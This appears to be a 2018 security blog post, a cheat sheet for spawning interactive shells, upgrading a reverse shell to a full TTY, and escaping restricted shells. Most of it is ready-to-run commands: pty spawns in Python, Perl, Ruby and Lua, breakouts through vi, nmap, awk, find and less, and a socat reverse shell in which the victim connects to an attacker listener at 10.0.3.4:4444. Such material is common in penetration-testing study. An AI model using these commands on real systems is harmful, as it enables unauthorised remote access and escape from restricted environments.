---
layout: post
title:  "Escaping & Spawning Interactive Shells"
date:   2018-11-08 10:00:00 +1100
categories: [security,tty]
permalink: /:title:output_ext
comments: true
---
<br>
**Source:** [netsec.ws](https://netsec.ws/?p=337) and [ropnop](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
<br>
#### Shell Spawning

**-- Python:**

    python -c 'import pty; pty.spawn("/bin/sh")'
    python3 -c 'import pty; pty.spawn("/bin/sh")'

Or if we can upload a payload, better to use the following to get a proper
interactive shell. [Python PTY Shell](https://github.com/infodox/python-pty-shells)

**-- Bash:**

    echo os.system('/bin/bash')
    /bin/sh -i

**-- Perl:**

    perl —e 'exec "/bin/sh";'
    perl: exec "/bin/sh";


**-- Ruby:**

    ruby: exec "/bin/sh"

**-- LUA:**

    lua: os.execute('/bin/sh')

**-- From within IRB**

    exec "/bin/sh"

**-- Inside vi:**

    :!bash
    :set shell=/bin/bash:shell


**-- Nmap <= 5.21:**

    nmap -V
    nmap --interactive
    !sh


**-- Socat:**

**#Listener:**

    socat file:`tty`,raw,echo=0 tcp-listen:4444

**#Victim:**

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  


**-- stty options:**

**In reverse shell**

    $ python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z

**In Kali**

    $ stty raw -echo
    $ fg
    press enter

**In reverse shell**
```bash
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
    
    
    
    sh -r 
    rsh

    rbash
    bash -r
    bash --restricted

    rksh
    ksh -r


[Sans article](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)

One of the most well documented techniques is to spawn a shell from within an
editor such as 'vi' or 'vim'. Open any file using one of these editors and type
the following and execute it from within the editor:

    :set shell=/bin/bash
    OR
    :set shell=/bin/sh

Next, type and execute:

    :shell

Another method is to type:

    :! /bin/bash
    awk 'BEGIN {system("/bin/sh")}'
    find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;


**More, Less, and Man Commands**
There is a known escape within these commands. After you use the 'more', 'less',
or 'man' command with a file, type '!' followed by a command. For instance, try
the following once inside the file:

    '! /bin/sh'
    '!/bin/sh'
    '!bash'


**Tee Command**

    echo "evil script code" | tee script.sh

More info on restricted shell found [here]
(https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
